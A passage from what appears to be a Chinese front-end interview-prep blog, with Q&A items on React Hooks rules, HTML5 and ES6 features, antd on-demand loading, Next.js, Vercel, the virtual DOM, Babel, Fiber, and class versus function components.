<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">condition</span>) &#123;<br>    <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 错误！不能在条件语句中使用 Hooks</span><br>  &#125;<br><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>正确的做法是将 Hooks 放在函数的顶层，确保每次渲染都按照相同的顺序调用它们：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 正确！在函数顶层使用 Hooks</span><br><br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">condition</span>) &#123;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>总之，为了确保 React 组件的正确运行和可维护性，应该遵循 Hooks 的规则，将它们放在函数的顶层使用，而不是在条件语句、循环或嵌套函数中。这有助于避免潜在的问题，并使代码更易于理解和维护。</p>
<h3 id="16、HTML5新特性"><a href="#16、HTML5新特性" class="headerlink" title="16、HTML5新特性"></a>16、HTML5新特性</h3><p>HTML5 是 HTML 的第五个主要版本，引入了许多新特性和改进，使得 Web 开发更加强大和丰富。以下是 HTML5 的一些主要新特性：</p>
<ol>
<li><p><strong>语义化标签：</strong> HTML5 引入了一些新的语义化标签，如 <code>&lt;header&gt;</code>、<code>&lt;nav&gt;</code>、<code>&lt;section&gt;</code>、<code>&lt;article&gt;</code>、<code>&lt;footer&gt;</code> 等，用于更清晰地表示文档的结构和内容，提高页面的可读性和可维护性。</p>
</li>
<li><p><strong>多媒体支持：</strong> HTML5 提供了 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 标签，使得在网页中嵌入音频和视频更加容易。它还支持音频和视频的流媒体播放、字幕、音轨选择等功能。</p>
</li>
<li><p><strong>画布和绘图：</strong> HTML5 引入了 <code>&lt;canvas&gt;</code> 标签，允许开发者使用 JavaScript 在网页上绘制图形、动画和交互性元素，创建复杂的图形应用程序。</p>
</li>
<li><p><strong>本地存储：</strong> HTML5 提供了本地存储选项，如 Web Storage 和 IndexedDB，使得网页可以在客户端存储数据，以提高性能和离线访问能力。</p>
</li>
<li><p><strong>新表单元素：</strong> HTML5 引入了一些新的表单元素，如 <code>&lt;input type=&quot;date&quot;&gt;</code>、<code>&lt;input type=&quot;email&quot;&gt;</code>、<code>&lt;input type=&quot;url&quot;&gt;</code> 等，以提高表单输入的精确性和用户体验。</p>
</li>
<li><p><strong>拖放功能：</strong> HTML5 支持拖放操作，允许用户拖拽元素并将其放置到其他地方，这为实现拖放功能提供了原生支持。</p>
</li>
<li><p><strong>地理位置信息：</strong> HTML5 提供了 Geolocation API，允许网页获取用户设备的地理位置信息，用于创建位置相关的应用和服务。</p>
</li>
<li><p><strong>WebSocket：</strong> HTML5 引入了 WebSocket 协议，支持双向通信，使得浏览器和服务器之间的实时通信更加高效。</p>
</li>
<li><p><strong>Web Workers：</strong> HTML5 支持 Web Workers，允许在后台线程中运行 JavaScript，提高了多线程处理和计算密集型任务的能力。</p>
</li>
<li><p><strong>SVG 支持：</strong> HTML5 增强了对可伸缩矢量图形（SVG）的支持，使得创建矢量图形和图表更加容易。</p>
</li>
<li><p><strong>响应式 Web 设计：</strong> HTML5 促进了响应式 Web 设计的发展，通过媒体查询和弹性布局使得网页能够适应不同设备和屏幕尺寸。</p>
</li>
<li><p><strong>语音识别和语音合成：</strong> HTML5 引入了 Speech API，支持语音识别和语音合成功能，用于创建语音控制和交互的应用程序。</p>
</li>
<li><p><strong>新的标签属性：</strong> HTML5 引入了许多新的标签属性，如 <code>data-*</code> 属性、<code>contenteditable</code> 属性、<code>placeholder</code> 属性等，用于增强标签的功能和样式。</p>
</li>
</ol>
<p>这些 HTML5 新特性不仅丰富了 Web 开发的功能和体验，还提高了性能、安全性和可访问性，使得构建现代 Web 应用更加便捷和强大。</p>
<h3 id="17、ES6新特性"><a href="#17、ES6新特性" class="headerlink" title="17、ES6新特性"></a>17、ES6新特性</h3><p>ECMAScript 6（ES6），也称为 ECMAScript 2015，是 JavaScript 的一个重要更新版本，引入了许多新特性和语法改进，以提高代码的可读性、可维护性和功能性。以下是 ES6 中的一些重要新特性：</p>
<ol>
<li><p><strong>块级作用域（Block Scope）：</strong> 引入 <code>let</code> 和 <code>const</code> 关键字，使变量可以在块级作用域内定义，而不再局限于函数作用域。</p>
</li>
<li><p><strong>箭头函数（Arrow Functions）：</strong> 提供了一种更简洁的函数声明语法，同时修正了函数内部 <code>this</code> 的指向问题。</p>
</li>
<li><p><strong>模板字符串（Template Strings）：</strong> 使用反引号 <code>`</code> 来创建多行字符串和嵌入表达式，使字符串拼接更加方便。</p>
</li>
<li><p><strong>解构赋值（Destructuring Assignment）：</strong> 可以从数组或对象中提取值并赋给变量，简化了变量的声明和赋值过程。</p>
</li>
<li><p><strong>默认参数（Default Parameters）：</strong> 允许函数参数设置默认值，当参数未传递时使用默认值。</p>
</li>
<li><p><strong>展开运算符（Spread Operator）：</strong> 用于数组和对象的展开操作，可以将数组元素或对象属性扩展到另一个数组或对象中。</p>
</li>
<li><p><strong>剩余参数（Rest Parameters）：</strong> 允许将函数的剩余参数合并成一个数组，方便处理不定数量的参数。</p>
</li>
<li><p><strong>类和继承（Classes and Inheritance）：</strong> 引入了 <code>class</code> 关键字，使得对象的定义和继承更加清晰和面向对象。</p>
</li>
<li><p><strong>模块化（Modules）：</strong> 提供了 <code>import</code> 和 <code>export</code> 关键字，用于模块化开发，帮助组织和管理代码。</p>
</li>
<li><p><strong>迭代器和生成器（Iterators and Generators）：</strong> 引入 <code>Symbol.iterator</code> 和 <code>function*</code>，支持可迭代对象和生成器函数，简化了异步编程。</p>
</li>
<li><p><strong>Promise：</strong> 提供了原生支持的 <code>Promise</code> 对象，用于处理异步操作，解决了回调地狱问题。</p>
</li>
<li><p><strong>Set 和 Map：</strong> 引入了 <code>Set</code> 和 <code>Map</code> 数据结构，提供了更灵活的数据存储和查询方式。</p>
</li>
<li><p><strong>Proxy 和 Reflect：</strong> <code>Proxy</code> 对象允许自定义对象的行为，<code>Reflect</code> 对象提供了一组用于操作对象的方法。</p>
</li>
<li><p><strong>Symbol：</strong> 引入了符号类型，用于创建唯一标识符，可以用于对象属性和迭代器等场景。</p>
</li>
<li><p><strong>模块化加载（Module Loading）：</strong> 引入了模块加载系统，可以异步加载模块，提高应用程序的性能和可维护性。</p>
</li>
<li><p><strong>String 扩展方法：</strong> 提供了许多新的字符串处理方法，如 <code>startsWith</code>、<code>endsWith</code>、<code>includes</code> 等。</p>
</li>
<li><p><strong>数字扩展方法：</strong> 提供了一些新的数字处理方法，如 <code>Number.isNaN</code>、<code>Number.isInteger</code> 等。</p>
</li>
<li><p><strong>新的数据结构：</strong> 引入了 <code>TypedArray</code>、<code>WeakSet</code>、<code>WeakMap</code> 等新的数据结构。</p>
</li>
<li><p><strong>更丰富的数学操作：</strong> 引入了 <code>Math</code> 对象的新方法，如 <code>Math.pow</code>、<code>Math.sign</code>、<code>Math.log10</code> 等。</p>
</li>
<li><p><strong>对象字面量扩展：</strong> 允许在对象字面量中使用简写属性名、计算属性名等。</p>
</li>
</ol>
<p>ES6 的引入使 JavaScript 变得更加现代化和功能丰富，让开发者可以更高效地编写清晰、可维护的代码。这些特性大大提升了 JavaScript 的编程体验和能力。</p>
<h3 id="18、antd为什么能按需加载"><a href="#18、antd为什么能按需加载" class="headerlink" title="18、antd为什么能按需加载"></a>18、antd为什么能按需加载</h3><p>Ant Design（antd）能够实现按需加载是因为它使用了webpack的模块系统以及babel插件来实现这一功能。</p>
<p>具体来说，antd通过以下几个步骤来实现按需加载：</p>
<ol>
<li><p><strong>组件库的模块化</strong>：Ant Design将每个组件都拆分成独立的模块，每个模块对应一个文件。这样做的好处是可以单独引入需要的组件，而不必加载整个组件库。</p>
</li>
<li><p><strong>babel-plugin-import 插件</strong>：antd提供了一个名为<code>babel-plugin-import</code>的Babel插件，它能够在代码编译过程中，将导入的组件库模块转化为按需加载的形式。</p>
<p>例如，如果你在代码中引入一个antd的组件：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Button</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;antd&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>使用<code>babel-plugin-import</code>插件后，它会将上述代码转化为按需加载的形式：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> _button = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;antd/lib/button&#x27;</span>);<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;antd/lib/button/style&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>这样只会加载<code>Button</code>组件所需的代码，而不会加载整个antd组件库。</p>
</li>
<li><p><strong>webpack的代码分割</strong>：webpack是一个模块打包工具，它能够将多个模块打包成一个或多个bundle文件。antd利用webpack的代码分割功能，确保在构建项目时只打包所需的组件，而不是全部组件。</p>
</li>
</ol>
<p>总的来说，通过以上步骤，antd实现了在项目中按需加载组件，从而减小了最终构建后的文件体积，提升了应用的性能和加载速度。这也是许多现代前端框架和库的常用优化策略之一。</p>
<h3 id="19、hooks解决了啥、注意事项"><a href="#19、hooks解决了啥、注意事项" class="headerlink" title="19、hooks解决了啥、注意事项"></a>19、hooks解决了啥、注意事项</h3><p>React Hooks 是 React 16.8 版本引入的功能，它们解决了 React 类组件的一些问题，并提供了更灵活、可复用和可测试的组件代码编写方式。以下是 React Hooks 解决的问题以及一些注意事项：</p>
<p><strong>React Hooks 解决的问题：</strong></p>
<ol>
<li><p><strong>状态逻辑复用</strong>：在类组件中，状态逻辑通常需要抽取到高阶组件（HOC）或渲染属性（Render Props）中以实现复用。Hooks 允许你在函数组件之间共享状态逻辑，使代码更具可读性和可维护性。</p>
</li>
<li><p><strong>组件复杂性降低</strong>：Hooks 可以将一个组件的生命周期相关逻辑（如 componentDidMount、componentDidUpdate 等）拆分成多个独立的函数，使组件更易于理解和维护。</p>
</li>
<li><p><strong>避免 Class 的限制</strong>：Hooks 允许你在无需编写类组件的情况下使用 React 的核心功能，如状态管理、副作用（例如 useEffect）、context 等。</p>
</li>
<li><p><strong>更简单的副作用管理</strong>：<code>useEffect</code> 钩子使副作用管理更加直观，能够取代类组件的 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 生命周期方法。</p>
</li>
<li><p><strong>减少样板代码</strong>：Hooks 可以帮助你减少类组件中的样板代码，例如构造函数、绑定方法和 this 引用。</p>
</li>
</ol>
<p><strong>React Hooks 使用的注意事项：</strong></p>
<ol>
<li><p><strong>仅在函数组件中使用</strong>：Hooks 只能在函数组件中使用，不能在类组件中使用。如果你需要在类组件中使用相似的功能，可以考虑使用 HOC 或 Render Props。</p>
</li>
<li><p><strong>不要在循环、嵌套函数、条件语句中使用 Hooks</strong>：Hooks 应该始终在函数组件的最顶层使用，不要在循环、条件语句或嵌套函数中使用。</p>
</li>
<li><p><strong>使用规则依赖性</strong>：<code>useEffect</code> 钩子的回调函数中，确保只依赖于那些在回调内部使用的变量。如果需要使用外部变量，将其包含在 <code>useEffect</code> 的依赖数组中，以便正确捕获变化。</p>
</li>
<li><p><strong>自定义 Hook 命名约定</strong>：自定义 Hooks 应该以 “use” 开头，以便在代码中识别它们是钩子。例如，<code>useMyCustomHook</code>。</p>
</li>
<li><p><strong>避免过度使用 Hooks</strong>：虽然 Hooks 提供了强大的功能，但不要过度使用它们。在某些情况下，使用类组件可能更合适。</p>
</li>
</ol>
<p>总的来说，React Hooks 提供了更现代和灵活的方式来编写 React 组件，但仍然需要遵循一些最佳实践和注意事项，以确保代码的正确性和可维护性。</p>
<h3 id="20、介绍一下next-js"><a href="#20、介绍一下next-js" class="headerlink" title="20、介绍一下next.js"></a>20、介绍一下next.js</h3><p>Next.js 是一个用于构建现代、灵活、可扩展的 React 应用程序的React 框架。它提供了许多功能和最佳实践，以简化前端应用程序的开发流程，并帮助你构建高性能、SEO 友好、服务器渲染（SSR）和静态生成（SSG）的网站。以下是 Next.js 的一些主要特点和优点：</p>
<ol>
<li><p>**服务器渲染 (SSR) 和静态生成 (SSG)**：Next.js 提供了服务器渲染和静态生成的能力，这意味着你可以在服务器上生成页面，提供更快的加载速度和更好的 SEO。你可以选择使用其中一种或两者结合使用。</p>
</li>
<li><p>**热模块替换 (HMR)**：Next.js 支持热模块替换，可以在开发过程中实时更新页面，无需手动刷新浏览器。</p>
</li>
<li><p><strong>自动代码拆分</strong>：Next.js 自动将应用程序代码拆分为较小的块，以提高页面加载性能。它只会发送客户端所需的代码，而不会发送整个应用程序。</p>
</li>
<li><p><strong>文件系统路由</strong>：使用文件和文件夹结构来定义页面路由，这使得路由配置简单直观。例如，<code>/pages/index.js</code> 表示主页，<code>/pages/about.js</code> 表示关于页面。</p>
</li>
<li><p><strong>数据获取</strong>：Next.js 提供了一组用于数据获取的方法，包括 <code>getServerSideProps</code>、<code>getStaticProps</code> 和 <code>getInitialProps</code>。这些方法使得从外部数据源获取数据变得容易，同时支持 SSR 和 SSG。</p>
</li>
<li><p><strong>自动预取</strong>：Next.js 会自动预取用户可能在未来导航到的页面，以提高用户体验。</p>
</li>
<li><p><strong>TypeScript 支持</strong>：Next.js 对 TypeScript 有很好的支持，可以帮助你在项目中使用类型安全的 JavaScript。</p>
</li>
<li><p><strong>插件系统</strong>：Next.js 允许你使用插件来扩展和定制功能，以适应项目的需要。</p>
</li>
<li><p><strong>静态导出</strong>：Next.js 支持将整个应用程序导出为静态 HTML 文件，以便部署到各种托管环境，如静态文件托管、CDN、服务器等。</p>
</li>
<li><p><strong>社区活跃</strong>：Next.js 拥有一个庞大的社区，有丰富的文档、示例和第三方库，可以加速开发。</p>
</li>
</ol>
<p>总之，Next.js 是一个功能强大的 React 框架，适用于构建现代的、高性能的 Web 应用程序。它通过提供一组有用的功能来简化开发过程，同时也提供了多种部署选项，使得构建高质量的应用变得更加容易。无论你是要构建单页面应用、多页面应用、博客、电子商务网站还是任何其他类型的 Web 应用，Next.js 都是一个值得考虑的选择。</p>
<h3 id="21、vercel"><a href="#21、vercel" class="headerlink" title="21、vercel"></a>21、vercel</h3><p>Vercel 是一个现代化的云平台，专注于托管和部署 Web 应用程序。它提供了一系列工具和服务，旨在简化开发者的工作流程，使他们能够轻松地将网站、应用程序和静态资产部署到全球性的 CDN（内容分发网络）上。以下是关于 Vercel 的一些主要特点和优势：</p>
<ol>
<li><p><strong>简化的部署流程</strong>：Vercel 提供了一个简单的部署流程，只需将你的代码库连接到 Vercel，它就会自动构建、部署和托管你的应用程序。这意味着开发者可以专注于编写代码，而不必担心服务器设置和复杂的部署过程。</p>
</li>
<li><p><strong>支持多种编程语言和框架</strong>：Vercel 不仅支持前端框架（如 React、Vue、Angular 等），还支持后端框架（如 Node.js、Python、Ruby 等），以及静态网站生成器（如 Next.js、Nuxt.js、Hugo 等）。</p>
</li>
<li><p><strong>全球 CDN 分发</strong>：Vercel 部署的应用程序和资产会被分发到全球性的 CDN 上，确保用户能够快速访问你的应用程序，减少加载时间。</p>
</li>
<li><p><strong>自动 HTTPS</strong>：Vercel 提供自动的 HTTPS 支持，保护你的应用程序和用户数据。无需手动配置 SSL 证书。</p>
</li>
<li><p><strong>Serverless 部署</strong>：Vercel 支持 Serverless 架构，可以轻松部署无服务器函数和 API 端点。它还与 AWS Lambda 集成，提供了无服务器计算的能力。</p>
</li>
<li><p><strong>多环境部署</strong>：你可以轻松创建和管理不同环境（如开发、测试、生产）的部署，以及自定义部署规则。</p>
</li>
<li><p><strong>团队协作</strong>：Vercel 支持团队协作，多人可以共同维护和部署项目，同时提供了 RBAC（基于角色的访问控制）功能。</p>
</li>
<li><p><strong>实时日志和监控</strong>：Vercel 提供实时日志和监控工具，让你能够追踪应用程序的性能和问题。</p>
</li>
<li><p><strong>扩展性和定制性</strong>：Vercel 提供了强大的自动化工具，但也允许你定制构建和部署流程，以满足你的特定需求。</p>
</li>
<li><p><strong>丰富的生态系统</strong>：Vercel 有一个庞大的开发者社区和生态系统，包括文档、示例、插件和第三方集成，为开发者提供了丰富的资源和工具。</p>
</li>
</ol>
<p>总之，Vercel 是一个强大而易于使用的云平台，适用于前端和后端开发者，以及构建 Web 应用程序、静态网站和 Serverless 函数的项目。它的简化部署流程、全球 CDN 分发、自动 HTTPS 支持和多种框架的兼容性，使其成为开发者构建和托管现代 Web 应用程序的理想选择。</p>
<h3 id="22、VDOM"><a href="#22、VDOM" class="headerlink" title="22、VDOM"></a>22、VDOM</h3><p>虚拟DOM（Virtual DOM）是一种用于提高Web应用性能的技术，通常与React等现代JavaScript库和框架一起使用。虚拟DOM的核心思想是将整个页面的DOM结构表示为一个轻量级的JavaScript对象树，称为虚拟DOM树。通过比较前后两次虚拟DOM树的差异，可以在必要时仅更新页面上实际发生变化的部分，从而减少了DOM操作，提高了页面渲染性能。</p>
<p>以下是关于 VDOM 的一些重要概念和工作原理：</p>
<ol>
<li><p><strong>创建虚拟 DOM</strong>：</p>
<p>当应用程序状态发生变化时，框架会生成一个新的虚拟 DOM 树，该树包含了所有组件的当前状态和结构信息。这个虚拟 DOM 树是一个轻量级的 JavaScript 对象，它代表了应用程序的视图结构。</p>
</li>
<li><p><strong>比较虚拟 DOM</strong>：</p>
<p>一旦新的虚拟 DOM 树被创建，框架会将新的虚拟 DOM 树与先前的虚拟 DOM 树进行比较，以找出两者之间的差异。这个过程通常被称为 “reconciliation”。</p>
</li>
<li><p><strong>计算差异</strong>：</p>
<p>在比较虚拟 DOM 树时，框架会计算出需要进行的 DOM 更新操作，例如添加、删除、更新元素等。这些更新操作会被保存在一个 “差异” 对象中。</p>
</li>
<li><p><strong>应用差异</strong>：</p>
<p>一旦计算出差异，框架会将这些差异应用于实际的 DOM，以使 DOM 结构与虚拟 DOM 树保持一致。这个过程通常被称为 “patching”。</p>
</li>
<li><p><strong>性能优势</strong>：</p>
<p>VDOM 的主要优势在于它可以在内存中高效地进行比较和计算，而不需要频繁地操作实际的 DOM。这减少了浏览器的重排（reflow）和重绘（repaint）操作，从而提高了页面的性能和响应速度。</p>
</li>
<li><p><strong>一致性和跨平台</strong>：</p>
<p>VDOM 抽象了实际 DOM，使得它在不同的浏览器和平台上具有一致的行为。这使得开发者不需要担心浏览器兼容性问题，可以更容易地构建跨平台应用。</p>
</li>
<li><p><strong>React 中的 VDOM</strong>：</p>
<p>React 是最著名的使用 VDOM 技术的框架之一。React 使用虚拟 DOM 来管理组件的渲染和更新，它通过比较前后两个虚拟 DOM 树来确定需要进行的 DOM 更新，从而提高了 React 应用程序的性能。</p>
</li>
</ol>
<p>总之，VDOM 是一种用于优化前端性能的技术，通过在内存中比较虚拟 DOM 树来减少不必要的 DOM 操作，从而提高了页面的性能和响应速度。它在现代前端框架中得到了广泛的应用，例如 React、Vue 等。</p>
<p>以下是虚拟DOM的工作原理和优势：</p>
<p><strong>工作原理：</strong></p>
<ol>
<li><p><strong>初始化：</strong> 当应用首次加载时，会通过JavaScript代码创建一个虚拟DOM树，该树与实际的DOM结构一一对应。这个虚拟DOM树是一个轻量级的JavaScript对象，包含了所有页面元素的层次结构和属性信息。</p>
</li>
<li><p><strong>渲染：</strong> 当数据发生变化时，React或其他支持虚拟DOM的库将重新渲染虚拟DOM树，生成新的虚拟DOM树。</p>
</li>
<li><p><strong>对比差异：</strong> 新旧虚拟DOM树会进行比较，找出它们之间的差异，这个过程称为”协调”。虚拟DOM可以高效地检测到哪些元素需要添加、更新或删除，而不需要直接操作实际的DOM。</p>
</li>
<li><p><strong>应用变化：</strong> 根据差异，虚拟DOM会生成一组最小的DOM操作，只更新实际需要变化的部分。这些DOM操作是高效的，因为它们只影响实际变化的部分，而不是整个页面。</p>
</li>
<li><p><strong>重绘页面：</strong> 最后，通过应用这些DOM操作，浏览器会重新绘制页面，但只会重新渲染发生变化的部分，而不是整个页面。</p>
</li>
</ol>
<p><strong>优势：</strong></p>
<ol>
<li><p><strong>性能优化：</strong> 虚拟DOM可以显著减少DOM操作的次数，从而提高了页面的渲染性能。因为DOM操作通常是较慢的，减少操作次数可以减少性能开销。</p>
</li>
<li><p><strong>跨平台：</strong> 虚拟DOM不仅可以在浏览器中使用，还可以在其他环境中使用，如React Native等。这使得开发跨平台应用更加方便。</p>
</li>
<li><p><strong>简化复杂性：</strong> 虚拟DOM可以隐藏底层DOM操作的复杂性，开发人员只需要关注数据和UI的关系，而不必手动管理DOM。</p>
</li>
<li><p><strong>提高开发效率：</strong> 虚拟DOM使得组件化开发变得更容易，开发人员可以更快速地构建和维护大规模应用。</p>
</li>
</ol>
<p>尽管虚拟DOM在性能和开发效率方面具有很多优势，但也需要注意，它并不是适用于所有情况的解决方案。在某些情况下，简单的应用可能不需要虚拟DOM，因为DOM操作不会造成性能瓶颈。因此，在选择是否使用虚拟DOM时，应根据具体的项目需求和性能优化要求来决策。</p>
<h3 id="23、谈谈你对Babel的理解，并说下它的原理"><a href="#23、谈谈你对Babel的理解，并说下它的原理" class="headerlink" title="23、谈谈你对Babel的理解，并说下它的原理"></a>23、谈谈你对Babel的理解，并说下它的原理</h3><p>Babel 是一个 JavaScript 编译器，用于将最新的 JavaScript 语法（如 ES6、ES7）转换为浏览器兼容的 ES5 语法。Babel 的主要功能是确保你编写的代码在所有浏览器中都能正常运行，不受浏览器对新特性支持程度的影响。</p>
<p>Babel 的原理：</p>
<ol>
<li>解析（Parsing）：Babel 首先将源代码解析为一个抽象语法树（Abstract Syntax Tree，简称 AST）。解析过程中，Babel 将源代码分解成词素（Tokens），然后根据语法规则将词素组合成 AST。AST 是一种树状结构，用于表示源代码的语法结构。</li>
<li>转换（Transforming）：在 AST 的基础上，Babel 使用插件（plugins）和预设（presets）进行转换。插件是用于实现具体语法转换或优化的功能模块，例如将箭头函数转换为普通函数。预设是一组插件的集合，用于处理一组相关的语法特性，如 ES2015+ 的新特性。</li>
<li>生成（Generating）：在转换阶段完成后，Babel 将修改后的 AST 转换回 JavaScript 代码。生成阶段可以保留原始代码中的格式和注释，或者使用压缩插件对代码进行优化。</li>
</ol>
<p>Babel 允许开发者使用最新的 JavaScript 语法和特性，同时确保代码在各种浏览器中兼容。通过对代码进行转换和优化，Babel 可以提高代码的可维护性和性能。</p>
<h3 id="24、说一下对fiber架构的理解"><a href="#24、说一下对fiber架构的理解" class="headerlink" title="24、说一下对fiber架构的理解"></a>24、说一下对fiber架构的理解</h3><p>Fiber架构是React框架的一种内部架构，用于处理组件的调度、渲染和更新。它于React 16版本中引入，旨在提高React应用程序的性能和用户体验。以下是对Fiber架构的理解：</p>
<ol>
<li><p><strong>可中断性：</strong> Fiber架构引入了可中断性，这意味着React可以在渲染过程中暂停并重新安排任务的执行。这对于保持应用的响应性非常重要，因为它允许浏览器在渲染期间处理其他重要的任务，例如用户输入或网络请求。</p>
</li>
<li><p><strong>优先级调度：</strong> Fiber引入了任务优先级的概念，将不同任务划分为不同的优先级。这使得React可以更好地响应用户交互，例如在用户与界面进行交互时优先渲染关键组件，以提供更好的用户体验。</p>
</li>
<li><p><strong>增量渲染：</strong> Fiber支持增量渲染，这意味着React可以将渲染工作分成多个小任务，并根据其优先级逐步执行。这降低了首次加载和更新时的渲染延迟，从而提高了性能。</p>
</li>
<li><p><strong>错误边界：</strong> Fiber允许React组件定义错误边界，这些错误边界可以捕获和处理组件中的错误，从而避免整个应用程序崩溃。这提高了应用程序的可靠性。</p>
</li>
<li><p><strong>可预测的渲染：</strong> Fiber的目标之一是使React的渲染过程更可预测。这有助于开发人员更好地理解和控制组件的渲染行为。</p>
</li>
<li><p><strong>并发模式：</strong> Fiber的架构为未来的并发模式打下了基础。并发模式允许React在多个线程中同时执行任务，以进一步提高性能。</p>
</li>
</ol>
<p>总的来说，Fiber架构的引入使React更具性能、可扩展性和可维护性。它改善了React在各种应用场景下的表现，并为未来的React版本和功能增加了更多的潜力。虽然Fiber对于大多数React开发者是透明的，但它在React内部对渲染和更新过程的管理方面做出了巨大的改进。</p>
<h3 id="25、比较react的类组件和函数组件"><a href="#25、比较react的类组件和函数组件" class="headerlink" title="25、比较react的类组件和函数组件"></a>25、比较react的类组件和函数组件</h3><p>React 中有两种主要类型的组件：类组件（Class Components）和函数组件（Function Components）。类组件和函数组件最大的不同还在于代码思路方面的不同。类组件是面向对象编程思维方式，函数组件是面向过程编程思维方式。React的设计思路更推崇组合，而不是继承。在类组件中大量使用继承会造成组件过重，功能难以拆分。</p>
<p><strong>类组件（Class Components）：</strong></p>
<ol>
<li><p><strong>基于类的定义：</strong> 类组件是通过创建一个继承自 <code>React.Component</code> 或 <code>React.PureComponent</code> 的JavaScript类来定义的。它们可以包含状态（state）和生命周期方法。</p>
</li>
<li><p><strong>状态管理：</strong> 类组件可以通过 <code>this.state</code> 来管理本地状态，通过 <code>this.setState()</code> 方法来更新状态。这使得它们适用于复杂的组件状态管理。</p>
</li>
<li><p><strong>生命周期方法：</strong> 类组件具有一系列生命周期方法，如 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 等，可以在不同的阶段执行操作，例如数据获取、订阅管理、DOM操作等。</p>
</li>
<li><p><strong>容器组件：</strong> 由于类组件具有状态和生命周期，它们通常被用作容器组件，用于管理和组织UI组件。</p>
</li>
<li><p><strong>React Hooks：</strong> 虽然类组件是React的传统方式，但React 16.8版本引入了React Hooks，使函数组件能够处理状态和生命周期，从而减少了对类组件的需求。</p>
</li>
</ol>
<p><strong>函数组件（Function Components）：</strong></p>
<ol>
<li><p><strong>基于函数的定义：</strong> 函数组件是通过编写JavaScript函数来定义的。它们通常比类组件更简洁。</p>
</li>
<li><p><strong>状态管理：</strong> 函数组件可以使用React Hooks（如 <code>useState</code>、<code>useEffect</code> 等）来管理状态。这使得状态管理更简单且更具可读性。</p>
</li>
<li><p><strong>生命周期：</strong> 函数组件通过 <code>useEffect</code> 钩子来处理副作用，例如数据获取、订阅管理和DOM操作。尽管没有类组件中那么多生命周期方法，但Hooks提供了足够的灵活性。</p>
</li>
<li><p><strong>函数式编程：</strong> 函数组件更符合函数式编程的思维方式，它们更容易测试和理解，尤其是在编写纯函数时。</p>
</li>
<li><p><strong>性能：</strong> 随着React的优化，函数组件和类组件之间的性能差距已经减小，甚至在某些情况下函数组件可能更快。</p>
</li>
</ol>
<p>总结来说，函数组件是React中的趋势，因为它们更简洁、易于理解和维护，尤其是在使用React Hooks时。在新的React项目中，建议优先选择函数组件，除非需要使用类组件的特定功能或在已有的类组件中进行维护。</p>
<p>需要注意的是，React社区不断发展，新的特性和最佳实践可能会随着时间的推移而变化，因此请查看官方文档以获取最新的建议和指南。</p>
<h5 id="类组件相对于函数式组件有什么优势"><a href="#类组件相对于函数式组件有什么优势" class="headerlink" title="类组件相对于函数式组件有什么优势"></a>类组件相对于函数式组件有什么优势</h5><p>虽然函数式组件在React中变得非常流行，但类组件仍然具有一些优势，尤其是在特定情况下。以下是一些类组件相对于函数式组件的优势：</p>
<ol>
<li><p><strong>状态管理的能力：</strong> 类组件可以更灵活地处理组件的状态（state）。它们可以通过 <code>this.state</code> 和 <code>this.setState()</code> 来管理本地状态，这使得它们非常适合处理复杂的组件状态。在某些情况下，使用 <code>setState</code> 的回调函数也可以更精细地控制状态更新。</p>
</li>
<li><p><strong>生命周期方法：</strong> 类组件具有一系列生命周期方法，如 <code>componentDidMount</code>、<code>componentDidUpdate</code> 和 <code>componentWillUnmount</code> 等，这些方法允许你在组件的不同生命周期阶段执行特定的操作。例如，你可以在 <code>componentDidMount</code> 中进行数据获取，或在 <code>componentDidUpdate</code> 中处理DOM操作。这些方法在某些情况下非常有用。</p>
</li>
<li><p><strong>容器组件：</strong> 类组件通常用作容器组件，它们可以包含和管理多个子组件。这使得它们在组织和管理复杂的UI组件结构时非常有用。容器组件可以将数据传递给子组件，并将子组件的状态提升到自己的状态中。</p>
</li>
<li><p><strong>组件实例：</strong> 类组件创建的是组件实例，你可以在组件实例中存储数据、引用DOM元素、维护特定的状态等。这些实例具有更多的生命周期控制和数据管理选项。</p>
</li>
<li><p><strong>历史：</strong> 类组件是React的传统方式，许多旧代码库和教程中仍然使用类组件。如果你维护或与这些代码库一起工作，了解类组件仍然很有价值。</p>
</li>
<li><p><strong>PropTypes：</strong> 类组件通常使用PropTypes来进行类型检查和验证。虽然PropTypes也可以用于函数组件，但它们更常用于类组件。</p>
</li>
</ol>
